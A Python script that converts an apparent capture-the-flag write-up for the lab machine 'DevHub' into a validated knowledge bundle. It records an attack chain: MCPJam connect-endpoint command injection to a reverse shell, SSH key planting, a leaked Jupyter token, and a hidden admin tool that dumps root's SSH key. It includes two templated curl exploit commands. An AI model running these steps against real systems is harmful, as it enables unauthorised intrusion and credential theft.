"""Build and validate the completed DevHub SemanticDraftBundle."""
import sys, pathlib
sys.path.insert(0, '/home/titagram/sedna/src')
sys.path.insert(0, '/home/titagram/sedna/tests/knowledge')
from test_semantic_llm import _prepared_from_markdown
from sedna.knowledge.semantic.drafts import SemanticDraftBundle
from sedna.knowledge.semantic.materialize import validate_segment_accounting

md=open('/home/titagram/htb-writeups/write-ups/machines/DevHub/DevHub.md').read()
prepared=_prepared_from_markdown(md,title='Machine: DevHub')
print('segments:',len(prepared.segments))

def step(local_id, ordinal, access_before, access_after, environment, privileges_before,
         privileges_after, observations, hypothesis, action, evidence, citation):
    return {
      'artifact_type':'case_step','local_id':local_id,'ordinal':ordinal,
      'state_before':{'access':access_before,'environment':environment,'privileges':privileges_before},
      'observations':observations,
      'hypotheses':[{'statement':hypothesis,'origin':'explicit'}],
      'selected_action':{'intent':action},
      'evidence':[{'summary':evidence,'origin':'explicit','category':'exploitation'}],
      'state_after':{'access':access_after,'environment':environment,'privileges':privileges_after},
      'origin':'explicit','citations':[{'segment_indexes':[citation]}]
    }

steps=[
 step('step-1',1,'unauthenticated network access','MCPJam Inspector access',['Linux','nginx','devhub.htb'],[],[],
      ['22/tcp SSH, 80/tcp nginx redirects to devhub.htb','6274/tcp MCPJam Inspector (SvelteKit, JS asset index-DRYhT9Xb.js)','landing page lists MCP Inspector, Jupyter analytics, git repo'],
      'the MCPJam Inspector exposes an MCP server management API on an unusual port',
      'enumerate the MCPJam API endpoints from the JS bundle','devhub.htb and MCPJam Inspector on 6274 identified',1),
 step('step-2',2,'MCPJam Inspector access','unauthenticated RCE as mcp-dev',['/api/mcp/connect','child_process.spawn'],[],['mcp-dev'],
      ['/api/mcp/connect accepts a serverConfig object','command passed to child_process.spawn unsanitized','full shell string as command fails with spawn ... ENOENT; binary + args array works'],
      'the connect endpoint spawns an attacker-controlled command without sanitization',
      'send a connect request with command /bin/bash and args array to get a reverse shell','reverse shell as mcp-dev obtained',3),
 step('step-3',3,'unauthenticated RCE as mcp-dev','stable SSH shell as mcp-dev',['SSH','authorized_keys'],[],['mcp-dev'],
      ['plant attacker SSH key in /home/mcp-dev/.ssh/authorized_keys via RCE','SSH in as mcp-dev'],
      'planting an SSH key gives a stable interactive shell',
      'write the attacker public key to authorized_keys and SSH in','stable SSH shell as mcp-dev',3),
 step('step-4',4,'stable SSH shell as mcp-dev','code execution as analyst',['Jupyter','localhost:8888','/etc/systemd/system/jupyter.service'],[],['analyst'],
      ['/home/analyst is drwxr-x--- analyst analyst and holds user.txt','jupyter.service leaks JUPYTER_TOKEN and runs as analyst','use the token to execute code in the analyst kernel'],
      'the Jupyter service file leaks a token that grants analyst code execution',
      'use the leaked Jupyter token to run code in the analyst kernel','user flag read and /opt/opsmcp/server.py copied',4),
 step('step-5',5,'code execution as analyst','root shell',['OPSMCP','localhost:5000','Flask'],[],['root'],
      ['/opt/opsmcp/server.py runs as root on localhost:5000','VALID_API_KEY hardcoded in server.py','hidden tool ops._admin_dump with target=ssh_keys reads /root/.ssh/id_rsa'],
      'a root-running Flask service with a hardcoded API key and hidden admin dump tool exposes root credentials',
      'call ops._admin_dump with the API key to dump the root SSH key, then SSH as root','root shell and root flag obtained',4),
]

bundle={
 'artifacts':[{
   'draft_type':'case','artifact_type':'case','knowledge_role':'case_study',
   'local_id':'case-devhub','origin':'explicit','title':'DevHub: MCPJam connect RCE, Jupyter token pivot, and OPSMCP hidden-tool root',
   'starting_access':'unauthenticated HTTP access to an MCPJam Inspector',
   'source_quality':'complete','difficulty':'medium',
   'outcome':'user and root proofs obtained; proof values redacted',
   'transferable_properties':[
     'MCPJam /api/mcp/connect command injection requires command as a binary plus args array, not a full shell string',
     'Jupyter service files can leak the token and grant code execution as the analyst user',
     'a root-running Flask service with a hardcoded API key and a hidden admin dump tool exposes root credentials',
     'internal loopback services (Jupyter, OPSMCP) are the privesc surface after foothold'
   ],
   'non_transferable_properties':['tokens, API keys, proof values, and service ports are target-specific'],
   'steps':steps,'citations':[{'segment_indexes':[1,2,3,4,6]}]
 }],
 'execution_examples':[
   {
    'local_id':'ex-mcpjam','parent_local_id':'step-2',
    'command_template':"curl -s http://{{target}}:{{port}}/api/mcp/connect -H 'Content-Type: application/json' -d '{\"serverId\":\"{{server_id}}\",\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"{{payload}}\"]}}'",
    'placeholders':[
      {'name':'target','kind':'target','binding_policy':'authorized_scope','role':'authorized MCPJam host'},
      {'name':'port','kind':'target','binding_policy':'authorized_scope','role':'MCPJam port'},
      {'name':'server_id','kind':'value','binding_policy':'host_supplied','role':'arbitrary server id'},
      {'name':'payload','kind':'value','binding_policy':'host_supplied','role':'command to execute'}],
    'capability_hint':'trigger MCPJam connect command injection','purpose':'obtain unauthenticated RCE as the MCPJam service user',
    'observed_role':'operator with authorized network access',
    'prerequisites':[{'statement':'the MCPJam connect endpoint is reachable and unsanitized','citations':[{'segment_indexes':[3]}]}],
    'platform_constraints':[{'dimension':'execution_environment','relation':'required','value':'MCPJam Inspector','citations':[{'segment_indexes':[3]}]}],
    'citations':[{'segment_indexes':[3]}]
   },
   {
    'local_id':'ex-opsmcp','parent_local_id':'step-5',
    'command_template':"curl -s http://{{target}}:{{port}}/tools/call -H 'X-API-Key: {{api_key}}' -H 'Content-Type: application/json' -d '{\"name\":\"ops._admin_dump\",\"arguments\":{\"target\":\"ssh_keys\",\"confirm\":true}}'",
    'placeholders':[
      {'name':'target','kind':'target','binding_policy':'authorized_scope','role':'authorized OPSMCP host'},
      {'name':'port','kind':'target','binding_policy':'authorized_scope','role':'OPSMCP port'},
      {'name':'api_key','kind':'value','binding_policy':'host_supplied','role':'hardcoded OPSMCP API key'}],
    'capability_hint':'dump the root SSH key via the hidden admin tool','purpose':'obtain root access from a root-running Flask service',
    'observed_role':'analyst code execution with loopback access to OPSMCP',
    'prerequisites':[{'statement':'the OPSMCP API key is known and the hidden tool is callable','citations':[{'segment_indexes':[4]}]}],
    'platform_constraints':[{'dimension':'os_family','relation':'required','value':'linux','citations':[{'segment_indexes':[4]}]}],
    'citations':[{'segment_indexes':[4]}]
   }
 ],
 'ignored_segment_indexes':[0,5]
}

b=SemanticDraftBundle.model_validate(bundle)
print('Pydantic OK. artifacts:',len(b.artifacts),'exec:',len(b.execution_examples))
validate_segment_accounting(prepared,b)
print('Segment accounting OK')
out=pathlib.Path('/tmp/bundles/DevHub.json'); out.parent.mkdir(parents=True,exist_ok=True)
out.write_text(b.model_dump_json(indent=2)); print('wrote',out)
